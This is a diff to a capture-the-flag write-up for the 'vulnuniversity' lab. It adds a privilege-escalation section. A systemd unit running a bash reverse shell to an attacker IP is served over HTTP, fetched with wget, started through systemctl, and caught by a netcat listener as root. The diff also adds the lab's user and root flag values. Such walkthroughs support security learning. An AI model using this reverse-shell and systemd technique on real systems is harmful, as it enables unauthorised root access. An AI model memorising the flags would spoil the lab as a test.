@@ -8,11 +8,11 @@
 **OS :** ?
 
 ##### **Conclusion**
-**Time :** 
+**Time :** 1h27
 	**Start :** 04/05/2025 16:35
 	**Break at/to :** 
-	**Finish :**
-**Satisfaction :** 
+	**Finish :** 04/05/2025 18:02
+**Satisfaction :** 8/10
 ## 1. **Reconnaissance**
 
 We start with an #nmap scan :
@@ -324,7 +324,105 @@ We are actually www-data and we want to be root. So we search for all the files 
 We can use systemctl for create a root shell.
 
 First 
+
+Attacker
+```BASH
+root@ip-10-10-16-93:~# cat root.service
+echo '[Unit]
+Description=Get Root Shell
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.16.93/4444 0>&1"
+
+[Install]
+WantedBy=multi-user.target' > /tmp/root.service
+root@ip-10-10-16-93:~# python3 -m http.server 3333
 ```
+
+
+After
+
+Victim
+```BASH
+$ wget http://10.10.16.93:3333/root.service
+--2025-05-04 11:53:37--  http://10.10.16.93:3333/root.service
+Connecting to 10.10.16.93:3333... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 190 [application/octet-stream]
+Saving to: 'root.service'
+
+     0K                                                       100% 46.9M=0s
+
+2025-05-04 11:53:37 (46.9 MB/s) - 'root.service' saved [190/190]
+
+$ ls
+root.service
+rootshell.c
+rt1747.service
+rt1898.service
+rtNxeP.service
+rtaUYr.service
+systemd-private-69646fbfe5ec44fc8f9655de3c4eb0ee-systemd-timesyncd.service-oyLOLg
+$ systemctl enable /tmp/root.service
+Failed to execute operation: Invalid argument
+```
+
+Second after
+
+Attacker
+```BASH
+root@ip-10-10-16-93:~# nc -nlvp 4444
+```
+
+
+End
+
+Victim
+```BASH
+$ systemctl start root
+```
+
+
+And here we are :
+
+```BASH
+root@ip-10-10-16-93:~# nc -nlvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.216.247 56740
+bash: cannot set terminal process group (2099): Inappropriate ioctl for device
+bash: no job control in this shell
+root@vulnuniversity:/# ls
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+root@vulnuniversity:/# whoami
+whoami
+root
+root@vulnuniversity:/# 
+```
+
 ## 7. **Actions on Objectives**
 
 user flag :
@@ -338,4 +436,19 @@ $ ls
 user.txt
 $ cat user.txt
 8bd7992fbe8a6ad22a63361004cfcedb
+```
+
+
+root flag :
+
+```BASH
+root@vulnuniversity:/# cd root
+cd root
+root@vulnuniversity:/root# ls
+ls
+root.txt
+root@vulnuniversity:/root# cat root.txt	
+cat root.txt
+a58ff8579f0a9270368d33a9966c7fd5
+root@vulnuniversity:/root# 
 ```
